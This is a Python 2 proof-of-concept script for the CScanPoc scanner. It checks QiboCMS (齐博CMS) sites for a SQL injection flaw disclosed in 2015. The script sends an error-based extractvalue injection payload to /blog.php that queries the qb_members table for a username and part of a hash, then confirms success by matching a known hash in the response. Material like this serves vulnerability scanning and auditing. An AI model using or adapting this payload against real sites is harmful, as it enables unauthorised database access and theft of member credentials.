# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2


class Vuln(ABVuln):
    vuln_id = 'QiboCMS_0031'  # 平台漏洞编号，留空
    name = '齐博CMS 注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-17'  # 漏洞公布时间
    desc = '''
        /blog/template/space/file/listbbs.php
        这个函数中的$TB_pre未初始化，然后根据齐博系统的伪全局变量注册。然后造成sql注入。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/3300/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'QiboCMS(齐博CMS)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'cc0cdc02-6c69-4e27-91da-8ae64f06797b'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/blog.php?id=1%20and%20extractvalue%281,concat%280x7e7e7e,%28select%20concat%28username,0x7c7c7c,SUBSTRING%28%28select%20md5%28c%29%20from%20qb_members%20limit%200,1%29,9,16%29%29from%20qb_members%20limit%200,1%29,0x7e7e7e%29%29"
            url = self.target + payload
            r = requests.get(url)

            if '4a8a08f09d37b73795649038408b5f33' in r.content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
